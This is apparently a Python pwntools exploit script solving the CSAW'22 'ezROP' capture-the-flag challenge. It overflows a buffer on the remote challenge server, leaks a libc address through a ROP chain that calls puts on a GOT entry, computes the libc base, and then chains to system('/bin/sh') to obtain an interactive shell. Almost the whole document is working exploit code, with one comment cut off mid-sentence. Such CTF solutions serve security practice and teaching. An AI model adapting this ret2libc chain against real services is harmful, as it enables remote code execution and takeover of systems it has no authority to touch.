
from pwn import *
puts_got = 0x403fe8
printf_got = 0x404020
puts_plt = 0x00000000004010a0
main = 0x0000000000401513
vul = 0x0000000000401343
pop_rdi = 0x00000000004015a3
ret = 0x000000000040101a
#p = process("chal/ezROP")
p = remote("pwn.chal.csaw.io",5002)

# We will skip a bit ahead in the main function by skipping the push rbp step, this seems
p.send(b"lmaokek\n"+b"a"*(112) + p64(pop_rdi) + p64(printf_got) + p64(puts_plt) + p64(ret) +p64(0x0000000000401510))

p.recvuntil("Nice to meet you, ! Welcome to CSAW'22!\n")
addr = p.recvline()[:-1]
puts_addr = u64(addr+ b'\x00'*(8-len(addr))) 

print("puts address:",hex(puts_addr))

base_addr = puts_addr - 0x61c90
print("Base address:",hex(base_addr))
system = base_addr + 0x52290
binsh = base_addr + 0x1b45bd


p.send(b"lmaokek\n"+b"a"*(112) +p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
p.interactive()

